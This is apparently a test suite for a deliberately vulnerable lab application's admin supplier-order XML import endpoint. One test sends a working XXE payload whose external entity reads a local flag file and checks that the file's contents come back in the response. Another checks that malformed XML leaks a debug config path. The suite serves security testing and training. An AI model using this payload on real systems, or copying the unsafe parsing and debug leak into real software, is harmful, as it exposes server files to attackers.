import path from "path";
import { pathToFileURL } from "url";
import { BASE_URL, loginOrFail, authHeaders, TEST_USERS } from "../helpers/api";
import { FLAGS } from "../helpers/flags";
const ENDPOINT = "/api/admin/suppliers/import-order";

function xmlPost(
  token: string,
  body: string,
  contentType = "text/xml"
): Promise<{ status: number; data: unknown }> {
  return fetch(`${BASE_URL}${ENDPOINT}`, {
    method: "POST",
    headers: {
      "Content-Type": contentType,
      ...authHeaders(token),
    },
    body,
  }).then(async (res) => {
    const contentTypeHeader = res.headers.get("content-type");
    const data = contentTypeHeader?.includes("application/json")
      ? await res.json()
      : await res.text();
    return { status: res.status, data };
  });
}

describe("XXE Supplier Order Import", () => {
  it("XXE attack reads local file and returns flag content", async () => {
    const adminToken = await loginOrFail(
      TEST_USERS.admin.email,
      TEST_USERS.admin.password
    );

    const projectRoot = process.cwd();
    const fileUrl = pathToFileURL(path.join(projectRoot, "flag-xxe.txt")).href;
    const xxeBody = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "${fileUrl}">
]>
<order>
  <supplierId>&xxe;</supplierId>
  <orderId>XXE-TEST-001</orderId>
  <total>100</total>
  <notes>XXE test</notes>
</order>`;

    const { status, data } = await xmlPost(adminToken, xxeBody);
    expect(status).toBe(200);

    const order = (data as { order?: { supplierId?: string } }).order;
    expect(order).toBeDefined();
    expect(order?.supplierId).toBeDefined();
    expect(order?.supplierId).toContain(FLAGS.XML_EXTERNAL_ENTITY_INJECTION);
  });

  it("Invalid XML structure returns debug config path", async () => {
    const adminToken = await loginOrFail(
      TEST_USERS.admin.email,
      TEST_USERS.admin.password
    );

    const invalidXml =
      '<?xml version="1.0"?><invalid><data>test</data></invalid>';
    const { status, data } = await xmlPost(adminToken, invalidXml);
    expect(status).toBe(400);

    const body = data as { debug?: { config?: string } };
    expect(body.debug).toBeDefined();
    expect(body.debug?.config).toBeDefined();
    expect(body.debug?.config).toContain("flag-xxe.txt");
  });

  it("Empty body is rejected", async () => {
    const adminToken = await loginOrFail(
      TEST_USERS.admin.email,
      TEST_USERS.admin.password
    );

    const { status, data } = await xmlPost(adminToken, "");
    expect(status).toBe(400);

    const body = data as { error?: string };
    expect(body.error).toMatch(/Empty request body/i);
  });

  it("Non-admin is rejected", async () => {
    const userToken = await loginOrFail(
      TEST_USERS.alice.email,
      TEST_USERS.alice.password
    );

    const validXml =
      '<?xml version="1.0"?><order><supplierId>SUP-001</supplierId><orderId>ORD-TEST</orderId><total>50.00</total><notes>Normal order</notes></order>';
    const { status } = await xmlPost(userToken, validXml);
    expect(status).toBe(403);
  });

  it("Valid XML without XXE works normally", async () => {
    const adminToken = await loginOrFail(
      TEST_USERS.admin.email,
      TEST_USERS.admin.password
    );

    const validXml =
      '<?xml version="1.0"?><order><supplierId>SUP-001</supplierId><orderId>ORD-TEST</orderId><total>50.00</total><notes>Normal order</notes></order>';
    const { status, data } = await xmlPost(adminToken, validXml);
    expect(status).toBe(200);

    const body = data as {
      message?: string;
      order?: {
        id?: number;
        supplierId?: string;
        orderId?: string;
        total?: number;
        notes?: string | null;
      };
    };
    expect(body.message).toMatch(/imported successfully/i);
    expect(body.order).toBeDefined();
    expect(body.order?.supplierId).toBe("SUP-001");
    expect(body.order?.orderId).toBe("ORD-TEST");
    expect(body.order?.total).toBe(50);
    expect(body.order?.notes).toBe("Normal order");
  });
});
